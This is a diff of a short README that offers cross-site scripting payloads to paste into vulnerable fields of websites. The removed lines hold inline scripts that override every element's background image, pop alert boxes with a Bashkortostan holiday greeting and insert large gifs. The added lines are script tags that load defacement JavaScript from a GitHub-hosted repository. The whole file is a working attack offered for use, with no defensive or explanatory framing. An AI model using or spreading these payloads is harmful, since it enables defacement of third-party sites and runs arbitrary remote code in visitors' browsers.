@@ -1,8 +1,19 @@
 Paste this into XSS vulnerable fields.
 
+
+Change all classes background to image
 ```html
-<script>const style = document.createElement('style');style.textContent = `*{background-image: url("https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/img/robots.jpg") !important;}`;document.head.appendChild(style);</script>
-<script>alert("С ДНЕМ РЕСПУБЛИКИ БАШКОРТОСТАН!"); alert("...");</script>
-<img src="https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/img/byvaet.gif" width="1000px" height="600px">
-<img src="https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/img/bashcortostan.gif" width="1000px" height="600px">
+<script src="https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/xss/inject_background.js"></script>
 ```
+
+Change all classes background to image (Short script)
+```html
+<script src="https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/xss/inject_background_short.js"></script>
+```
+
+
+Change all classes background to image, alerts and gifs on page
+```html
+<script src="https://raw.githubusercontent.com/exploits1337/internet-intelligence-tools/refs/heads/main/xss/inject_background_gifs.js"></script>
+```
+
